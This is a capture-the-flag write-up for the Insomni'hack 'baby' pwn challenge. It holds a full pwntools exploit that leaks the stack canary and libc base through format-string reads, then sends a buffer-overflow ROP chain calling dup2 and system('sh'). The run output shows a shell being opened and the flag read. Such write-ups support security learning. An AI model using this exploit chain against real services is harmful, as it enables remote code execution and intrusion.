# baby - Pwn - 50 pts - realized by grimmlin

Exploit: 

```python
#!/usr/bin/env python

from pwn import *

local = False

def p(string): print text.green_on_black("[*] " + string)

def leak_canary():
    x.recvuntil('Your choice > ')
    x.sendline('2')
    x.recvuntil('Your format > ')
    x.sendline('%138$p')
    canary = int(x.recvline().rstrip(), 16)
    x.sendline('')
    return canary

def leak_fclose_address():
    x.recvuntil('Your choice > ')
    x.sendline('2')
    x.recvuntil('Your format > ')
    x.sendline('%158$p')
    fclose_addr = int(x.recvline().rstrip(), 16) - libc_start_main_offset
    x.sendline('')
    return fclose_addr

def send_exploit(canary, system, shell, dup2):

    buffer_size = 1300
    descriptor = 4

    if local:
        pop_rdi_ret_address = libc.address + 0x000000000001fc3a 
        pop_rsi_ret_address = libc.address + 0x000000000001fbea 
    else:
        pop_rdi_ret_address = libc.address + 0x0000000000021102
        pop_rsi_ret_address = libc.address + 0x00000000000202e8 

    x.recvuntil('Your choice > ')
    x.sendline('1')
    x.recvuntil('? ')
    x.sendline(str(buffer_size))

    payload  = "A" * 1032
    payload += p64(canary)
    payload += "B" * 8

    """
    dup2(rdi = descriptor, rsi = 0)
    dup2(rdi = descriptor, rsi = 1)
    """

    payload += p64(pop_rdi_ret_address)
    payload += p64(descriptor)

    payload += p64(pop_rsi_ret_address)
    payload += p64(0)
    payload += p64(dup2)

    payload += p64(pop_rsi_ret_address)
    payload += p64(1)
    payload += p64(dup2)

    """
    system('/bin/sh')
    """
    payload += p64(pop_rdi_ret_address)
    payload += p64(shell)
    payload += p64(system)

    payload += "A" * (buffer_size - len(payload))

    x.sendline(payload)


if __name__ == "__main__":
    if local:
        x = remote('127.0.0.1', 1337)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
        libc_start_main_offset = 241
    else:
        x = remote('baby.teaser.insomnihack.ch', 1337)
        libc = ELF('./libc.so')
        libc_start_main_offset = 240

    canary_leak = leak_canary()
    p(hex(canary_leak) + " <- leaked canary")

    fclose_leak = leak_fclose_address()
    p(hex(fclose_leak) + " <- leaked fclose() address")

    libc.address = fclose_leak - libc.symbols['__libc_start_main']
    p(hex(libc.address) + " <- libc base address")

    system_address = libc.symbols['system']
    p(hex(system_address) + " <- computed system() address")

    shell_address = next(libc.search('sh\x00'))
    p(hex(shell_address) + " <- computed 'sh\\x00' address")

    dup2_address = libc.symbols['dup2']
    p(hex(dup2_address) + " <- computed dup2() address")

    send_exploit(canary_leak, system_address, shell_address, dup2_address)

    x.interactive()
```

Solution:

```
root@kali64:~/baby$ ./exploit.py
[+] Opening connection to baby.teaser.insomnihack.ch on port 1337: Done
[*] '/root/baby/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0x7971cd723454900 <- leaked canary
[*] 0x7f129d2be740 <- leaked fclose() address
[*] 0x7f129d29e000 <- libc base address
[*] 0x7f129d2e3390 <- computed system() address
[*] 0x7f129d2afe70 <- computed 'sh\x00' address
[*] 0x7f129d394d90 <- computed dup2() address
[*] Switching to interactive mode
Good luck !
$ id
uid=1001(baby) gid=1001(baby) groups=1001(baby)
$ ls
baby
flag
$ cat flag
INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
```
